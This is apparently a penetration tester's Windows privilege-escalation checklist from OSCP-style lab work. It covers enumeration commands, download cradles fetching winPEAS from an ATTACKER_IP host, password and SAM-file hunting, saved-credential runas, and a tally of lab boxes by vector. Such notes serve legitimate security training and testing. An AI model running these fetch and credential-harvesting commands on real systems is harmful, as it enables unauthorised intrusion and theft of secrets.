# Windows Privilege Escalation Methodology

Run in order. Follow links for exploitation details.

## 1. Current User Context
```cmd
whoami /priv
```
SeImpersonatePrivilege? --> [[Token-Impersonation]]

```cmd
whoami /groups
```
Look for: Administrators, Backup Operators, Server Operators, DnsAdmins

## 2. Automated Enumeration
```cmd
.\winPEASx64.exe
```

Download cradle:
```powershell
iwr http://ATTACKER_IP/winPEASx64.exe -outfile winPEASx64.exe
```
```cmd
certutil -urlcache -f http://ATTACKER_IP/winPEASx64.exe winPEASx64.exe
```

## 3. Services
See [[Service-Exploits]]
```cmd
wmic service get name,displayname,pathname,startmode
```

## 4. Scheduled Tasks
See [[Scheduled-Tasks]]
```cmd
schtasks /query /fo LIST /v
```

## 5. DLL Hijacking
See [[DLL-Hijacking]]

## 6. AlwaysInstallElevated
See [[AlwaysInstallElevated]]
```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

## 7. Stored Credentials
```cmd
cmdkey /list
```
If entries found:
```cmd
runas /savecred /user:REDACTED cmd.exe
```

## 8. Unquoted Service Paths
See [[Unquoted-Service-Paths]]

## 9. Registry Autoruns
See [[Registry-Autorun]]

## 10. Internal Services
```cmd
netstat -ano
```
Look for services bound to 127.0.0.1 only.

## 11. Password Hunting
```cmd
findstr /si "password" *.txt *.ini *.config *.xml
```
```cmd
dir /s /b *pass* *cred* *vnc* *.config 2>nul
```
```cmd
reg query HKLM /f password /t REG_SZ /s
```
```cmd
reg query HKCU /f password /t REG_SZ /s
```

## 12. SAM/SYSTEM Backup Files
```cmd
type C:\Windows\Repair\SAM
type C:\Windows\System32\config\RegBack\SAM
type C:\Windows\System32\config\RegBack\SYSTEM
```

## 13. Installed Programs
```cmd
wmic product get name,version
```
```powershell
Get-WmiObject Win32_Product | Select-Object Name,Version
```

## 14. PowerShell History
```cmd
type C:\Users\USER\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

## Automated Tools

| Tool | Command |
|------|---------|
| WinPEAS | `.\winPEASx64.exe` |
| PowerUp | `Import-Module .\PowerUp.ps1; Invoke-AllChecks` |
| Seatbelt | `.\Seatbelt.exe -group=all` |
| SharpUp | `.\SharpUp.exe audit` |

- WinPEAS: https://github.com/carlospolop/PEASS-ng/releases

---

## From Your Boxes

> **Most common Windows privesc paths across 20+ boxes:**
> - **Token impersonation (SeImpersonate + Potato)** was the #1 vector (10+ boxes): Craft, BillyBoss, Bounty, Squid, Trace, AuthBy, Relia 249, Relia 247, Skylark 225, OSCP A MS01, OSCP B MS01, Medtech 121
> - **Service binary replacement** appeared 3 times: Pascha (GPGOrchestrator), Medtech CLIENT02 (auditTracker), Medtech DEV04 (backup.exe)
> - **DLL hijacking** appeared 3 times: Jacko, Access, Relia 248
> - **AlwaysInstallElevated** appeared 2 times: Shenzi, Love
> - **Unquoted service paths** appeared 2 times: Skylark 226, React
>
> **Key takeaway**: Run `whoami /priv` immediately. If SeImpersonate is there, try PrintSpoofer first (modern OS) or JuicyPotato (older OS). That single check solves half of Windows boxes.
